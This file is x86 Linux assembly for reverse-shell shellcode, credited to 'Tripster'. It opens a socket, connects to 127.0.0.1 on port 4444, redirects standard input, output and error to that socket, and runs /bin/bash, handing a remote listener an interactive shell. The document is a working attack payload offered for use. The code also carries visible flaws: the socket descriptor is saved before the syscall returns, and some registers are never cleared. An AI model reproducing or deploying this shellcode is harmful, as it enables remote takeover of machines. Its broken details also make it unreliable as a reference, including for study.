;Reverse shell x86/linux	
;Author : Tripster
 



;int socketcall(int call, unsigned long *args);

section .TEXT
global _start

_start:
	;socket(PF_INET, SOCK_STREAM, 0)
xor eax,eax
push eax 
mov al,102                                        ;socket_syscall
mov bl,0x01                                       ;socket()
push byte 0x1					                            ;Sock_Stream
push byte 0x2					                            ;AF_INET
mov ecx,esp			                                  ;pointer to  second argument for socket arguments
mov esi,eax					                              ;store result returned sockfd for later use
int 0x80



	;connect(s, (struct sockaddr *)&addr, sizeof(addr))
	;setup struct for connect() argument 
	;addr.sin_family = AF_INET;
  ;addr.sin_port = htons(port);
  ;addr.sin_addr.s_addr = inet_addr("127.0.0.1");	
push DWORD 0x100007f				                      ;push 127.0.0.1
push word 0x5c11                                  ;push port number 
push byte 0x2                                     ;AF_INET
mov ecx,esp					                              ;mov structure reference
push 0x10					                                ;push sizeof addr	
push ecx				                                  ;push address of pointer for the strucuture
push esi					                                ;sockfd
mov ecx,esp
xor eax,eax
mov al,102
xor ebx,ebx
mov bl,0x03
int 0x80



	;Socketcalls done, now we do normal sytemcall
	;dup2(socketfd, 0/1/2)
	
mov ebx, esi  					;Reference to socketid 
xor eax, eax 					 
mov al, 0x3f 					; SYS_DUP2 
xor ecx, ecx  				; 0 
int 0x80 	
	 
xor eax, eax 					 
mov al, 0x3f 					; SYS_DUP2 
inc ecx  					
int 0x80  	

xor eax, eax 					 
mov al, 0x3f 					; SYS_DUP2 
inc ecx  					    
int 0x80 		




	;execve("////bin/bash", NULL, NULL)
xor eax, eax 					; Clear EAX 
mov al, 0x0b 					; SYS_EXECVE 
push edx  					  ;Push NULL character to stack (EDX is still NULL) 
push 0x68736162 			; "hsab" 
push 0x2f6e6962 			; "/nib" 
push 0x2f2f2f2f 			; "////" 
mov ebx, esp 					; Reference to "////bin/bash" on stack 
xor ecx, ecx 					; 2nd argument NULL 
int 0x80 					    ; Exec syscall  	
